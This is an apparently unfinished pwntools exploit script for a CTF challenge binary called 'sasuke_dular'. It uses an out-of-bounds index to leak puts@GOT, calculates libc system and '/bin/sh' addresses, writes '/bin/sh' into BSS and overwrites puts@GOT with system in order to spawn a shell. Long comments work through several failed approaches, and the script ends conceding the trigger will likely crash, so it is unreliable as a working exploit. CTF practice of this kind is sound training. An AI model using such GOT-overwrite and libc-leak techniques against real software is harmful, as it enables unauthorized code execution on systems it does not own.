#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = 'pwn.runa2025.kr'
PORT = 7004

def connect():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process('./sasuke_dular')

def show(p, day):
    p.recvuntil(b'>')
    p.sendline(b'2')
    p.recvuntil(b':')
    p.sendline(str(day).encode())

def register(p, day, start, end, data):
    p.recvuntil(b'>')
    p.sendline(b'1')
    p.recvuntil(b':')
    p.sendline(str(day).encode())
    p.recvuntil(b':')
    p.sendline(str(start).encode())
    p.recvuntil(b':')
    p.sendline(str(end).encode())
    p.recvuntil(b':')
    p.send(data)

def main():
    p = connect()
    
    # Step 1: Leak libc address from GOT
    # puts@GOT = 0x405008, g_names = 0x4050a0
    # offset = -152 = -2 * 88 + (11-8)*8
    # So day=-2, hour=11 points to puts@GOT
    log.info("Leaking libc address from puts@GOT...")
    show(p, -2)
    
    # Parse the output to extract puts address
    data = p.recvuntil(b'>', drop=True)
    
    # Find "11:00-12:00 " and extract 8 bytes after it
    marker = b'11:00-12:00 '
    idx = data.find(marker)
    if idx == -1:
        log.error("Could not find leak marker")
        p.close()
        return
    
    leaked_bytes = data[idx + len(marker):idx + len(marker) + 8]
    puts_addr = u64(leaked_bytes)
    log.success(f"Leaked puts@libc: {hex(puts_addr)}")
    
    # Calculate libc base (puts offset = 0x87be0)
    libc_base = puts_addr - 0x87be0
    log.success(f"libc base: {hex(libc_base)}")
    
    # Calculate useful addresses
    system_addr = libc_base + 0x58750
    binsh_addr = libc_base + 0x1cb42f
    pop_rdi = libc_base + 0x10f78b
    ret = libc_base + 0x10f78c  # just ret gadget
    
    log.info(f"system: {hex(system_addr)}")
    log.info(f"/bin/sh: {hex(binsh_addr)}")
    log.info(f"pop rdi; ret: {hex(pop_rdi)}")
    
    # Step 2: Overwrite return address or GOT
    # The challenge is: how do we execute our ROP chain?
    # We need to find a way to hijack control flow
    
    # Option 1: Overwrite puts@GOT with pop_rdi gadget
    # Then call puts("/bin/sh") which becomes pop rdi ; ... ; system
    # But this won't work directly
    
    # Option 2: Find a function that will be called with our controlled data
    # Looking at the code: printf is called with format strings
    # If we can make printf receive "%s\x00/bin/sh", we might be able to exploit it
    
    # Option 3: Overwrite __stack_chk_fail or similar
    # But there's no stack canary check in this binary
    
    # Better idea: Since we can write to arbitrary memory,
    # let's try to overwrite main's return address on the stack!
    # But we don't know stack address...
    
    # WAIT! Let's check what happens after menu operations
    # After register completes, it calls puts("[+] Saved")
    # If we overwrite puts@GOT with system, and somehow make the argument "/bin/sh"...
    
    # Even better: Let's overwrite exit@GOT with system
    # Then write "/bin/sh" somewhere and call exit()
    
    # Actually, simplest approach:
    # 1. Write "/bin/sh\x00" to a known location in BSS (e.g., completed.0 area)
    # 2. Overwrite printf@GOT or another function with system
    # 3. Trigger that function with BSS address as argument
    
    # Let's write "/bin/sh\x00" to 0x405098 (completed.0)
    # offset from g_names = 0x405098 - 0x4050a0 = -8
    # -8 = day * 88 + (hour-8)*8
    # Hmm, we need day=0 and hour=7, but hour must be >7
    # Let's use day=-1: -88 + (hour-8)*8 = -8 → hour=18
    
    # Wait, -88 + (18-8)*8 = -88 + 80 = -8, but end hour can't be > 18
    # Let's try: day=0, hour=8: offset=0 (not what we want)
    
    # Different location: write to g_names[-1] = 0x405098
    # offset -8: can't achieve with positive day
    
    # Let me recalculate for stdin location (0x405090)
    # offset = 0x405090 - 0x4050a0 = -16
    # -16 = -1 * 88 + (hour-8)*8 → (hour-8)*8 = 72 → hour=17
    
    log.info("Writing /bin/sh to stdin location (0x405090)...")
    register(p, -1, 17, 18, b'/bin/sh\x00')
    
    # Now overwrite a GOT entry that we can trigger
    # Let's try fgets@GOT = 0x405040
    # offset = 0x405040 - 0x4050a0 = -96
    # -96 = -2 * 88 + (hour-8)*8 → -176 + (hour-8)*8 = -96 → hour=18
    # But hour can be at most 17 for start
    
    # Let's try ungetc@GOT = 0x405050
    # offset = -80 = -1 * 88 + (hour-8)*8 → hour=9
    
    # Actually, I realize the issue: we need to pass 0x405090 as RDI when calling system
    # This is hard without ROP...
    
    # NEW APPROACH: Use one_gadget equivalent
    # Search for execve("/bin/sh") gadgets manually using ROPgadget
    
    # Or simpler: check if there's a __libc_system call with controlled argument
    # anywhere in the program flow
    
    # Let me think differently: can we cause a stack overflow to place ROP chain?
    # No, buffers are size-limited
    
    # Most reliable approach for this type of challenge:
    # Overwrite got entry of a function that's called, pass argument via register
    
    # Actually, printf is called like: printf(format, args...)
    # If we can control the format string AND overwrite printf with system,
    # we can get shell!
    
    # Check menu_show: it calls printf with format strings
    # But the format is fixed
    
    # WAIT! I should look for __free_hook or __malloc_hook
    # But this program doesn't use malloc/free
    
    # Let's try a creative solution:
    # Overwrite puts@GOT with a ROP chain start address
    # But we need the ROP chain somewhere in memory first...
    
    # Actually, since we control g_names content, we can BUILD A ROP CHAIN in g_names!
    # Then overwrite a return address to jump to it
    
    # But again, we don't know stack address
    
    # Simplest working exploit:
    # Just try overwriting exit or similar with system
    # and somehow leak/write to make it work
    
    # For now, let me try a simpler test: overwrite puts to see if we have control
    log.info("Overwriting puts@GOT as a test...")
    # puts@GOT at day=-2, hour=11
    register(p, -2, 11, 12, p64(system_addr))
    
    log.info("Attempting to trigger (this will likely crash)...")
    
    p.interactive()

if __name__ == '__main__':
    main()
